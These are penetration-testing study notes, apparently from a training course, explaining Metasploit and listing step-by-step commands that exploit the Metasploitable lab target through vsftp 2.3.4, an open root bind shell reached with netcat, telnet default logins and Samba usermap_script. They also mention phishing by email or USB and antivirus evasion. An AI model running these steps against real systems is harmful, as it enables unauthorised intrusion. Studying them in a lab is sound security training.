# Exploitation

We exploit one of the vulnerabilities we discovered to send a payload to the target. This will allow us to execute commands on the target system and navigate files. 

The payload tells the target system to make a connection to the hacker's computer and allow it to execute commands.

Social engineering is used whenever there are no known vulnerabilities on a target. We would try to get the target to open our payload themselves through a spoofed email or USB drive.

## Vulnerabilities

Exploitable vulnerabilities are possible because ports must be open on computers in order to connect to the internet. The goal is to gain access to poorly written software through an open port on a computer.

However, a lot of companies are extremely secure, so the most vulnerable targets will be employees through social engineering attacks.

## Reverse and Bind Shells

Shells will usually be the payloads we drop on a target. There are two different types of shells we will use: reverse and bind.

Reverse shells will try to connect back to the hacker's computer through TCP connection.

Bind shells are used whenever the target has an open port, we connect to it with our computer and pass the payload. This are less common because of firewall security features.

## Metasploit Framework

Metasploit offers thousands of exploits (Ruby) for Windows, Mac, and Linux. It also offers payloads (singles - standalone payload like adding a user or running an application, stagers - set up connection between attacker and target, stages - components downloaded by stagers modules), auxiliary modules (scanning, fuzzing, and DoS), encoders (helps evade antivirus detection, but most antivirus software is familiar with this), evasion modules (similar to encoders), nops (stops programs from running to allocate memory for future programs), and post exploitation modules (gather info like files saved, passwords, dumping hashes, enumerating the services and applications, etc.) as well.

Navigate to the exploits folder of metasploit and `nano FILENAME` to see details of how the exploit works.

### Msfconsole

`msfconsole` - opens metasploitable console

`help` - shows available commands

`show MODULENAME` - list available commands within a specific module

`use MODULENAME/FILEPATH` - execute a module command
    `use exploit/windows/smb/ms06_040_netapi`
    `show info` - shows more information on command
    `show options` - options available for the command
    `set OPTION NEWVALUE` - update a specific option's value
    `show payloads` - shows list of payloads available for this specific exploit
    `show targets` - shows list of targets vulnerable to this specific exploit
    `exploit` - run exploit

### First Exploits 

### vsftp 2.3.4 Exploitation

`sudo nmap -sV METASPLOITABLE` - scan for open ports

`searchsploit vsftp 2.3.4` - search metasploit framework for known exploits

`search vsftp` - (in msfconsole)

`use EXPLOITPATH`

`show info` - learn more about this specific exploit

`show options` - see parameters we need to use

`set RHOSTS METASPLOITABLE` - update target ip

`show payloads` - see default payloads to be sent

`show targets`

`exploit` - run the exploit

`whoami` `pwd` `ifconfig` `exit`

### Bindshell Exploitation (Misconfiguration)

Sometimes misconfigurations happen. Metasploitable has it's root shell open on a port. This isn't an 'exploit', just a misconfiguration that allows us root access.

`nc -h` - menu for netcab. We can connect or listen for inbound connections to ports.

`nc METASPLOITABLE 1524` - gives us access to root account

### Telnet Exploitation (Information Disclosure)

Run when telnet port is open. Telnet requires username and password to login, sometimes these are set to default.

`telnet METASPLOITABLE` - pulls up metasploitable cli, which tells us the login information. Login doesn't give us root access, however

`sudo su` - gives access to root account

### Samba Exploitation (Software Vulnerability)

nmap scan shows samba is running on open port, but does not give us the specific version. Searchsploit returns a lot of results for known exploits for different Samba versions. We can use a metasploit module to help.

`use auxiliary/scanner/smb/smb_version`

`show info` - description shows this module displays system versions

`show options` - see required parameters

`set RHOSTS IPADDRESS`

`run` - returns the specific Samba version

`searchploit Samba 3.0.20` - look for executables

`search samba` - search metasploit to find searchploit reference

`use exploit/multi/samba/usermap_script`

`show info` `show options`

`run`